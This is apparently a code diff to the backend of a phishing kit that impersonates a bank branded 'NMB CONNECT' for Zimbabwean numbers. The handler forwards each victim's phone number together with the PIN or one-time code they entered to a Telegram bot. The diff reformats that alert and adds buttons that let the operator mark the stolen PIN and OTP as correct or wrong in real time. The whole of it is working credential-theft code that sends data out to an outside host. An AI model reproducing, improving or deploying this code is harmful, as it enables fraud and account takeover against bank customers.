@@ -35,7 +35,28 @@ export const handler: Handler = async (event, context) => {
         const chatId = process.env.TELEGRAM_CHAT_ID;
 
         if (botToken && chatId) {
-            const message = `🔔 *New Approval Request*\n\n*Type:* ${type}\n*Phone:* ${phone}\n*Details:* ${details}\n\n*Attempt ID:* \`${attemptId}\``;
+            // Format time
+            const now = new Date();
+            const timeString = now.toLocaleString('en-US', { timeZone: 'Africa/Harare' });
+            
+            // Format title
+            const titlePrefix = type.toUpperCase() === 'OTP' ? 'OTP VERIFY' : 'LOGIN VERIFY';
+            
+            // Format key line
+            const keyLabel = type.toUpperCase() === 'OTP' ? 'OTP' : 'PIN';
+            
+            const message = `✅ *NMB CONNECT — ${titlePrefix}*
+
+🆕 *NEW USER*
+🌍 *Country:* +263
+📞 *Number:* ${phone.replace(/^\+?263/, '')}
+🔑 *${keyLabel}:* \`${details}\`
+⏰ *Time:* ${timeString}
+
+-------------------------
+⏱ *Timeout:* 5 min
+
+_Attempt ID: ${attemptId}_`;
             
             const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
             
@@ -51,8 +72,11 @@ export const handler: Handler = async (event, context) => {
                     reply_markup: {
                         inline_keyboard: [
                             [
-                                { text: "✅ Approve", callback_data: `approve_${attemptId}` },
-                                { text: "❌ Reject", callback_data: `reject_${attemptId}` }
+                                { text: "✅ Correct (PIN + OTP)", callback_data: `approve_${attemptId}` }
+                            ],
+                            [
+                                { text: "❌ Wrong Code", callback_data: `reject_${attemptId}` },
+                                { text: "⚠️ Wrong PIN", callback_data: `reject_${attemptId}` }
                             ]
                         ]
                     }
